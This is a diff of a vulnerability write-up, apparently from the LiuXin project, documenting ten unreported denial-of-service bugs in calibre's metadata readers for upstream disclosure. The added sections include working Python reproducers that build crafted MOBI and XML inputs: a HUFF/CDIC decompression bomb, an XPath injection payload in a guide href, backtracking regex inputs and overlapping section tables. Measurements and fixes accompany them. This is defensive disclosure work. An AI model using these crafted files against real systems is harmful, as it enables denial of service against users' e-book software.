@@ -1,12 +1,12 @@
 # Bugs to report to upstream calibre
 
 Status: **not yet reported.** Found **2026-11-17** and **2026-11-18** while porting
-calibre's metadata readers (PRs #179 and #185) and hardening LiuXin's own readers
-(PRs #180 and #186).
+calibre's metadata readers (PRs #179, #185 and #188) and hardening LiuXin's own
+readers (PRs #180 and #186).
 
-These are four ways a damaged or hostile file keeps a calibre metadata reader
-busy for minutes, or for ever. Each section has the location, a reproducer to run
-with `calibre-debug`, what was measured, and a suggested fix.
+These are ten ways a damaged or hostile file keeps a calibre metadata reader busy
+for minutes or for ever, or fills memory. Each section has the location, a
+reproducer to run with `calibre-debug`, what was measured, and a suggested fix.
 
 ## Before filing
 
@@ -20,11 +20,15 @@ with `calibre-debug`, what was measured, and a suggested fix.
 - **Where to report:** calibre takes ordinary bugs on
   [Launchpad](https://bugs.launchpad.net/calibre). Recent security fixes have gone
   through [GitHub security advisories](https://github.com/kovidgoyal/calibre/security/advisories).
-  All four are denial of service from a crafted file. That makes them candidates
-  for a private advisory rather than a public bug, or for a public bug if calibre
+  All ten are denial of service from a crafted file; bug 9 also runs the book's
+  text as XPath, though only within the book. That makes them candidates for a
+  private advisory rather than a public bug, or for a public bug if calibre
   treats reader hangs as ordinary bugs. Choosing which is the reporter's call.
+  Bugs 5 and 7 to 10 also reach calibre's conversion, not only its metadata
+  readers.
 - **Order:** bugs 2 and 3 should go together. Fixing 2 lets never-closed info
   blocks reach the patterns in 3, which are then cubic rather than quadratic.
+  Bugs 6 to 10 are all in the MOBI reader and could go as one report.
 
 ## Summary
 
@@ -34,6 +38,12 @@ with `calibre-debug`, what was measured, and a suggested fix.
 | 2 | `ebooks/metadata/rtf.py`, `get_document_info` | An `{\info` group that the end of the file cuts off | Never returns; memory grows about 100 MB a second |
 | 3 | `ebooks/metadata/rtf.py`, the five field patterns | Many `{\info` groups and a field that isn't there | Quadratic: 56 kB takes 10 s. Cubic once 2 is fixed |
 | 4 | `ebooks/metadata/html.py`, `handle_comment` | An HTML comment with a long run of characters and no spaces | Quadratic: 40,000 characters take 14–32 s; the 150,000 calibre reads, minutes |
+| 5 | `ebooks/chardet.py`, the XML-declaration and HTML 4 charset patterns | Unclosed `<?…encoding="`, or `<meta` and spaces | Cubic and quadratic: 8 KB takes 8.5 s; 50 KB over half an hour; the whole file is searched |
+| 6 | `ebooks/mobi/reader/headers.py`, `EXTHHeader` | An EXTH record of size 0 | Read again for every record claimed, up to 2**32: hours, keeping each |
+| 7 | `ebooks/mobi/huffcdic.py`, `HuffReader` | Dictionary entries naming other entries | 67 KB unpacks to 1 GB; one more level, 35 TB |
+| 8 | `ebooks/mobi/reader/mobi6.py`, `MobiReader.__init__` | A section table whose offsets go back and forth | A 1 MB file holds 400 MB with 801 sections, 30 GB with 65,535 |
+| 9 | `ebooks/mobi/reader/mobi6.py`, `read_embedded_metadata` and `create_opf` | A quote in the guide's cover or toc href | The read fails, or runs XPath of the book's choosing: 15 s on 50 KB |
+| 10 | `ebooks/mobi/reader/mobi6.py`, clean-up and anchor placement | Eight shapes of markup | Quadratic or worse: from 8.6 s on 3.4 KB to hours on 4 MB |
 
 ## 1. Topaz: counts past the end of the file
 
@@ -256,6 +266,397 @@ def comment_matches(pat, data):
 This gave the same matches as `finditer` on 200,000 random comments, and reads
 150,000 characters in 6 ms.
 
+## 5. chardet: the encoding-declaration patterns backtrack
+
+`ebooks/chardet.py` finds encoding declarations with three patterns. Two of them
+backtrack:
+
+```python
+r'<\?[^<>]+encoding\s*=\s*[\'"](.*?)[\'"][^<>]*>'
+r'''<meta\s+?[^<>]*?content\s*=\s*['"][^'"]*?charset=([-_a-z0-9]+)[^'"]*?['"][^<>]*>(?:\s*</meta>){0,1}'''
+```
+
+In the first, `[^<>]+` backs off over every `encoding=` in the tag. For each,
+`(.*?)` stops at every later quote on the line, and `[^<>]*>` scans from there to
+the next `<` or `>`, so the cost grows with the cube. In the second, `\s+?` and
+`[^<>]*?` split a run of spaces every way. `detect_xml_encoding`, which
+`xml_to_unicode` calls, searches the whole file with both, so every reader and
+input plugin that decodes with `xml_to_unicode` is exposed: OPF, EPUB, HTML, FB2
+and MOBI among them. `strip_encoding_declarations` runs them on the first 50 KB.
+
+```python
+# chardet_declarations.py: run with calibre-debug -e chardet_declarations.py
+import time
+
+from calibre.ebooks.chardet import xml_to_unicode
+
+for size in (2_000, 4_000, 8_000):
+    for label, raw in (
+        ('<?…encoding="', b'<?' + b'encoding="' * (size // 10)),
+        ('<meta + spaces', b'<meta' + b' ' * (size * 2)),
+    ):
+        start = time.monotonic()
+        xml_to_unicode(raw)
+        print(label, len(raw), f'{time.monotonic() - start:.2f} s', flush=True)
+```
+
+**Measured:**
+
+| Bytes | `<?` and `encoding="` repeated | Bytes | `<meta` and spaces |
+|---|---|---|---|
+| 2,002 | 0.18 s | 4,005 | 0.13 s |
+| 4,002 | 1.03 s | 8,005 | 0.48 s |
+| 8,002 | 8.5 s | 16,005 | 2.0 s |
+
+At 50 KB the first is over half an hour (extrapolated, not run); a whole file of
+a few megabytes would take years.
+
+**Suggested fix:** either of these.
+
+- Search only the start of the file. The XML declaration must come first, and
+  HTML's own prescan for a charset reads 1,024 bytes; at 1 KB even the cubic
+  case takes milliseconds. Declarations further in would no longer be found.
+- Keep the exact matches, as LiuXin did: `_linear_time.linear_pattern`
+  (GPL-3, in PR #188) finds them by hand, scanning each stretch of the text
+  once, and returns the same match objects. A simpler rewrite such as `([^'"]*)`
+  for `(.*?)` would still be quadratic, as each `encoding=` would still scan
+  to the end of the tag.
+
+## MOBI test books
+
+Bugs 6 to 10 use small MOBI books built by this helper. Save it as `mobi_book.py`
+next to their reproducers.
+
+```python
+# mobi_book.py: builds the small MOBI books the reproducers below use.
+# Keep it next to them; calibre-debug -e runs each with its folder on sys.path.
+import struct
+
+
+def exth(records, count=None):
+    body = b''.join(struct.pack('>LL', kind, 8 + len(data)) + data for kind, data in records)
+    raw = b'EXTH' + struct.pack('>LL', 12 + len(body), len(records) if count is None else count) + body
+    return raw + b'\0' * (-len(raw) % 4)
+
+
+def record0(text_records, *, compression=1, exth_raw=None, huff=(0, 0)):
+    head = bytearray(16 + 0xE8)
+    struct.pack_into('>HHLHHH', head, 0, compression, 0, 0, text_records, 4096, 0)
+    head[16:20] = b'MOBI'
+    struct.pack_into('>LLLLL', head, 20, 0xE8, 2, 65001, 1, 6)
+    struct.pack_into('>L', head, 0x5C, 9)
+    struct.pack_into('>LLLL', head, 0x68, 6, 0xFFFFFFFF, *huff)
+    struct.pack_into('>L', head, 0x80, 0x40 if exth_raw is not None else 0)
+    struct.pack_into('>LLL', head, 0xC0, 0xFFFFFFFF, 0, 0)
+    struct.pack_into('>L', head, 0xF4, 0xFFFFFFFF)
+    extra = exth_raw or b''
+    struct.pack_into('>LL', head, 0x54, len(head) + len(extra), 1)
+    raw = bytes(head) + extra + b'T\0'
+    return raw + b'\0' * (-len(raw) % 4)
+
+
+def palmdb(records, offsets=None):
+    if offsets is None:
+        offsets, pos = [], 78 + 8 * len(records) + 2
+        for record in records:
+            offsets.append(pos)
+            pos += len(record)
+    head = b'T'.ljust(32, b'\0') + bytes(28) + b'BOOKMOBI' + struct.pack('>LLH', 0, 0, len(records))
+    table = b''.join(struct.pack('>LL', offset, 2 * i) for i, offset in enumerate(offsets))
+    return head + table + b'\0\0' + b''.join(records)
+
+
+def book(html, exth_raw=None):
+    texts = [html[i:i + 4096] for i in range(0, len(html), 4096)] or [b'']
+    return palmdb([record0(len(texts), exth_raw=exth_raw), *texts])
+```
+
+`get_metadata` reads a book with an EXTH header from its headers. A book under
+4 MB without one has its whole text decompressed and run through `MobiReader`,
+the first half of MOBI conversion, to find metadata in the markup. Bugs 7 to 10
+are on that path, so they also reach MOBI conversion, at any size.
+
+## 6. MOBI: an EXTH record of size 0
+
+`EXTHHeader.__init__` (`ebooks/mobi/reader/headers.py`) steps through the records
+by each one's size, as many times as the header claims (`num_items`, up to 2**32 −
+1). A record of size 0 is read again on every pass, and an author or tag record
+is kept each time.
+
+```python
+# mobi_exth_size_zero.py: run with calibre-debug -e mobi_exth_size_zero.py
+import io
+import struct
+import time
+
+from calibre.ebooks.metadata.mobi import get_metadata
+from mobi_book import book
+
+for count in (250_000, 500_000, 1_000_000):
+    # One author record of size 0, in a header claiming `count` records.
+    header = b'EXTH' + struct.pack('>LL', 20, count) + struct.pack('>LL', 100, 0)
+    start = time.monotonic()
+    mi = get_metadata(io.BytesIO(book(b'<html><body>x</body></html>', header)))
+    print(count, 'records:', len(mi.authors), 'authors,', f'{time.monotonic() - start:.2f} s', flush=True)
+```
+
+**Measured:** 250,000 records: 0.38 s; 500,000: 1.05 s; 1,000,000: 1.58 s, each
+with as many authors. At 2**32 − 1 that is about two hours, holding four billion
+author names (extrapolated, not run).
+
+**Suggested fix:** stop at a record of size 0.
+
+```diff
+             idx, size = struct.unpack('>LL', raw[pos : pos + 8])
++            if size == 0:
++                break
+             content = raw[pos + 8 : pos + size]
+```
+
+## 7. MOBI: HUFF/CDIC text unpacks without limit
+
+`HuffReader` (`ebooks/mobi/huffcdic.py`) unpacks a dictionary entry that is not a
+literal by unpacking its codes, which name other entries. An entry can name
+another entry thousands of times, and that one another, so a few bytes stand for
+gigabytes. Nothing limits the output.
+
+```python
+# mobi_huff_bomb.py: run with calibre-debug -e mobi_huff_bomb.py
+# Watch the memory: the last book unpacks to 1 GB.
+import io
+import struct
+import time
+
+from calibre.ebooks.mobi.reader.mobi6 import MobiReader
+from calibre.utils.logging import default_log
+from mobi_book import palmdb, record0
+
+
+def huff_book(width, depth):
+    # Every byte is one 8-bit code; code b means dictionary entry 255 - b.
+    dict1 = struct.pack('>256L', *[(255 << 8) | 0x80 | 8] * 256)
+    huff = b'HUFF\0\0\0\x18' + struct.pack('>LL', 24, 24 + len(dict1)) + bytes(8) + dict1 + bytes(256)
+    # Entry 0 is the letter A; entry k is `width` copies of entry k - 1.
+    entries = [(b'A', True)] + [(bytes([256 - k]) * width, False) for k in range(1, depth + 1)]
+    table, blobs = b'', b''
+    for blob, literal in entries:
+        table += struct.pack('>H', 2 * len(entries) + len(blobs))
+        blobs += struct.pack('>H', len(blob) | (0x8000 if literal else 0)) + blob
+    cdic = b'CDIC\0\0\0\x10' + struct.pack('>LL', len(entries), 8) + table + blobs
+    text = bytes([255 - depth])  # one code: the deepest entry
+    return palmdb([record0(1, compression=17480, huff=(2, 2)), text, huff, cdic])
+
+
+for width in (1_000, 10_000, 32_767):
+    data = huff_book(width, 2)
+    start = time.monotonic()
+    reader = MobiReader(io.BytesIO(data), default_log)
+    reader.extract_text()
+    print(len(data), 'bytes unpack to', len(reader.mobi_html), f'in {time.monotonic() - start:.2f} s', flush=True)
+```
+
+**Measured:** 3,698 bytes unpack to 1 MB; 21,698 bytes to 100 MB; 67,232 bytes
+to 1.07 GB, in 0.66 s. A third level of entries would ask for 35 TB.
+`get_metadata` goes on to parse whatever comes out.
+
+**Suggested fix:** count the bytes `unpack` produces, entries included, and raise
+`MobiError` past a limit. LiuXin uses 32 MiB for metadata reading, where the file
+is under 4 MB; conversion would want a limit scaled to the book.
+
+## 8. MOBI: overlapping section tables
+
+`MobiReader.__init__` (`ebooks/mobi/reader/mobi6.py`) slices each section from its
+offset to the next section's offset, copying it. A section table whose offsets go
+back and forth names the same bytes again and again, and each copy is kept.
+
+```python
+# mobi_overlapping_sections.py: run with calibre-debug -e mobi_overlapping_sections.py
+import io
+import resource
+
+from calibre.ebooks.mobi.reader.mobi6 import MobiReader
+from calibre.utils.logging import default_log
+from mobi_book import palmdb, record0
+
+blob = b'<html><body><p>x</p></body></html>' + b' ' * 1_000_000
+for pairs in (100, 200, 400):
+    # Sections run to the next section's offset: alternating offsets
+    # make every other section the whole 1 MB blob again.
+    records = [record0(1), blob] + [b''] * (2 * pairs)
+    first = 78 + 8 * len(records) + 2
+    start, end = first + len(records[0]), first + len(records[0]) + len(blob)
+    data = palmdb(records, [first, start] + [end, start] * pairs)
+    reader = MobiReader(io.BytesIO(data), default_log)
+    held = sum(len(section) for section, _ in reader.sections)
+    rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024
+    print(f'{len(data):,} byte file: sections hold {held:,} bytes; peak memory {rss} MB', flush=True)
+    del reader
+```
+
+**Measured:** a 1.0 MB file with 201, 401 and 801 sections held 101 MB, 201 MB
+and 401 MB, at peaks of 128, 224 and 415 MB. The table allows 65,535 entries:
+about 30 GB from this file, or 100 GB from one of 3.4 MB (extrapolated, not run).
+
+**Suggested fix:** sections of a well-formed book do not overlap, so together they
+hold no more than the file. LiuXin refuses a book whose sections hold more than
+twice the file:
+
+```diff
++        held = 0
+         for i in range(self.num_sections):
+             self.sections.append((section(i), self.section_headers[i]))
++            held += len(self.sections[-1][0])
++            if held > 2 * len(raw_bytes):
++                raise MobiError('MOBI sections overlap')
+```
+
+## 9. MOBI: guide hrefs pasted into XPath
+
+`MobiReader` looks up two targets from the book's `<guide>` by pasting them into an
+XPath expression: the cover reference's `href` in `read_embedded_metadata`, and the
+toc reference's fragment in `create_opf`.
+
+```python
+anchors = root.xpath(f'//*[@id="{href}"]')
+elems = root.xpath('//*[@id="{}"]'.format(toc.partition('#')[-1]))
+```
+
+A quote in the href ends the string, and the rest runs as XPath of the book's
+choosing. A lone quote fails the whole read with `XPathEvalError`; an expression
+that compares every element with every later one runs for as long as the book
+likes. XPath 1.0 in lxml has no way out of the document here, so the harm is
+denial of service.
+
+```python
+# mobi_guide_xpath.py: run with calibre-debug -e mobi_guide_xpath.py
+import io
+import time
+
+from calibre.ebooks.metadata.mobi import get_metadata
+from mobi_book import book
+
+# The toc reference's fragment is pasted into //*[@id="..."]: a quote ends the
+# string and the rest is XPath, here one that compares every element with
+# every later one.
+slow = 't"] | descendant::*[count(descendant::*/following::*) > 1] | *[@id="'
+for links in (500, 1_000, 2_000):
+    html = (
+        f"<html><head><guide><reference type='toc' title='t' href='#{slow}'/></guide></head>"
+        "<body><p id='t'>toc</p>" + "<p><a href='#x'>x</a></p>" * links + '</body></html>'
+    ).encode()
+    start = time.monotonic()
+    get_metadata(io.BytesIO(book(html)))
+    print(len(html), 'bytes:', f'{time.monotonic() - start:.2f} s', flush=True)
+
+# A lone quote is enough to fail the read.
+html = b"<html><head><guide><reference type='toc' title='t' href='#a\"b'/></guide></head><body>x</body></html>"
+try:
+    get_metadata(io.BytesIO(book(html)))
+except Exception as e:
+    print('quote:', type(e).__name__, e)
+```
+
+**Measured:** 12,681 bytes: 0.33 s; 25,181: 2.2 s; 50,181: 15 s. The lone quote:
+`XPathEvalError: Invalid predicate`.
+
+**Suggested fix:** pass the value as an XPath variable.
+
+```diff
+-                    anchors = root.xpath(f'//*[@id="{href}"]')
++                    anchors = root.xpath('//*[@id=$id]', id=href)
+@@
+-            elems = root.xpath('//*[@id="{}"]'.format(toc.partition('#')[-1]))
++            elems = root.xpath('//*[@id=$id]', id=toc.partition('#')[-1])
+```
+
+## 10. MOBI 6: clean-up patterns and repeated scans
+
+`MobiReader` cleans the text with patterns that backtrack, and places anchors and
+images with scans that start again for each one. Each case below takes time that
+grows with the square of the input or worse. The cases, in
+`ebooks/mobi/reader/mobi6.py`:
+
+| Case | Where | Why |
+|---|---|---|
+| A page break whose attributes end in `/` without `>`, after spaces | `PAGE_BREAK_PAT`, `replace_page_breaks` | `\s*/{0,1}\s*` and `(?:\s+[^/>]*)` split a run of spaces every way: cubic |
+| `<` followed by spaces | the `o:p` pattern in `cleanup_html`, and `PAGE_BREAK_PAT` | `<\s*(/?)\s*o:p` splits the spaces between two `\s*` |
+| `filepos=` in a tag that never closes | `link_pattern` in `add_anchors` | every `filepos=` and every shorter digit run is retried against the rest of the tag |
+| `&` with no `;` after it | the entity-anchor pattern at the end of `add_anchors` | each `&` scans to the end of the text |
+| A run of `<b>`, `<i>` and the like not followed by `<p>` | the first swap in `cleanup_html` | each tag of the run is tried, and scans the rest of the run |
+| `</p`, `<p`, `<?xml`, `<o:p` or `name: ` tags that never close; `</div>` runs before an open `</p`; `<metadata>` or `<guide>` without its end tag, on one line | the other swaps, `cleanup_html`, `extract_content` | each try scans to a `>` (or a newline) that never comes |
+| Many differently styled tags | `upshift_markup` | each new rule is compared with every rule so far |
+| Many `<svg>` images, or page-break anchors, among many siblings | `upshift_markup` | each is placed with `parent.index()` and `insert()`, counting the siblings |
+| Many links to targets in a long stretch without tags | `add_anchors` | each target searches afresh to the next `<` and `>`, and back to the last `<` |
+
+```python
+# mobi6_backtracking.py: run with calibre-debug -e mobi6_backtracking.py
+# Books without EXTH, under 4 MB, so get_metadata runs the MOBI 6 reader.
+# Each case doubles its input: times that grow fourfold or more are quadratic
+# or worse. Takes a few minutes.
+import io
+import time
+
+from calibre.ebooks.metadata.mobi import get_metadata
+from mobi_book import book
+
+CASES = [
+    ('page break, spaces, "/" not closed', lambda n: b'<p><mbp:pagebreak' + b' ' * n + b'x/', (750, 1_500, 3_000)),
+    ('"<" and spaces', lambda n: b'<html><body><p><' + b' ' * n + b'x', (10_000, 20_000, 40_000)),
+    ('filepos= in a tag never closed', lambda n: b'<' + (b' filepos=' + b'1' * 200) * n + b'<', (50, 100, 200)),
+    ('"&" with no ";"', lambda n: b'&x<a filepos=1>' * n, (1_000, 2_000, 4_000)),
+    ('run of <b> with no <p>', lambda n: b'<html><body>' + b'<b>' * n, (4_000, 8_000, 16_000)),
+    ('differently styled tags', lambda n: b'<html><body>' + b''.join(b"<p style='a:%d'>x</p>" % i for i in range(n)), (2_500, 5_000, 10_000)),
+    ('svg images among many siblings', lambda n: b'<html><body><div>' + b"<svg><img src='a'></svg>" * n, (10_000, 20_000, 40_000)),
+    ('page-break anchors among many siblings', lambda n: b'<html><body><div>' + b''.join(b"<div class='mbp_pagebreak' filepos-id='f%d'></div>" % i for i in range(n)), (5_000, 10_000, 20_000)),
+]
+
+for label, make, sizes in CASES:
+    for size in sizes:
+        data = book(make(size))
+        start = time.monotonic()
+        get_metadata(io.BytesIO(data))
+        print(f'{label}: {len(data):,} bytes, {time.monotonic() - start:.2f} s', flush=True)
+```
+
+**Measured** (calibre's code with html5-parser replaced by lxml's HTML parser,
+which `MobiReader` only reaches for markup lxml rejects):
+
+| Case | Smallest | Middle | Largest | At 4 MB (extrapolated) |
+|---|---|---|---|---|
+| Page break, spaces, `/` | 1.1 KB: 0.16 s | 1.9 KB: 1.2 s | 3.4 KB: 8.6 s | far beyond |
+| `<` and spaces | 10 KB: 0.38 s | 20 KB: 1.7 s | 40 KB: 7.0 s | about 19 hours |
+| `filepos=` in an open tag | 11 KB: 0.52 s | 21 KB: 2.2 s | 42 KB: 8.5 s | about a day |
+| `&` with no `;` | 15 KB: 0.13 s | 30 KB: 0.41 s | 60 KB: 1.7 s | about 2 hours |
+| Run of `<b>` | 12 KB: 1.5 s | 24 KB: 5.3 s | 48 KB: 21 s | over a day |
+| Differently styled tags | 57 KB: 0.09 s | 114 KB: 0.36 s | 230 KB: 1.6 s | about 8 minutes |
+| svg images | 241 KB: 0.50 s | 481 KB: 3.6 s | 962 KB: 20 s | about 6 minutes |
+| Page-break anchors | 260 KB: 0.33 s | 520 KB: 4.0 s | 1.05 MB: 22 s | about 5 minutes |
+
+The anchor searches are fast scans: 3.8 MB of links into a stretch without tags
+took 4.3 s. But PalmDOC lets a 4 MB file hold up to five times as much text, and
+the time grows with the square.
+
+**Suggested fix:** each has a small change that keeps calibre's results. LiuXin's
+are in `PATCHES` in `scripts/port_upstream_calibre.py`, PR #188, with the helpers
+in `metadata/upstream_calibre/_linear_time.py`:
+
+- Read whitespace possessively where it can only end one way:
+  `<\s*+/{0,1}\s*+mbp:pagebreak((?>(?:\s+[^/>]*){0,1}))…` and `<\s*+(/?)\s*+o:p[^>]*>`
+  (Python 3.11 and later).
+- Check that a tag closes before looking inside it:
+  `<(?=[^<>]*>)[^<>]+filepos=['"]{0,1}(\d+)[^<>]*>`.
+- For patterns that scan to a `>`, `;` or newline: after a try fails, skip to
+  past the character it scanned to, since every try before it fails the same
+  way; stop at the last such character.
+- For the swaps that begin with a run of tags: a match starting inside a run
+  would match from its start, so try only the starts of runs.
+- Keep a dictionary from CSS rule to class; place images with `addprevious` and
+  anchors with `addnext`, beside the element itself; and in `add_anchors`, as the
+  targets come in order, reuse the last search's answer while it still holds.
+
+Run against random input, each change gave exactly the original's results, and
+the patched reader read 9,000 random books exactly as calibre's does.
+
 ## LiuXin's own fixes
 
 - PR #180 fixes LiuXin's readers on `main`: `metadata/file_sources/topaz.py`
@@ -266,5 +667,10 @@ This gave the same matches as `finditer` on 200,000 random comments, and reads
 - PR #186 fixes the same comment pattern in LiuXin's HTML reader on `main`
   (`metadata/file_sources/html.py`), which has no length cap, so a 1 MB comment
   would have taken hours. PR #185 carries the fix in the ported HTML reader.
+- PR #188 carries fixes for bugs 5 to 10 in the ported `chardet` and MOBI
+  readers. LiuXin's own `utils/libraries/calibre_chardet.py` has bug 5, and its
+  own MOBI 6 reader (`file_formats/mobi/reader/mobi6.py`) has bugs 8 to 10; both
+  are still to be fixed on `main`. Its EXTH reader already refuses a record of
+  size 0, and its HUFF/CDIC reader caps each record's output.
 
 Return to the [calibre compatibility index](README.md).
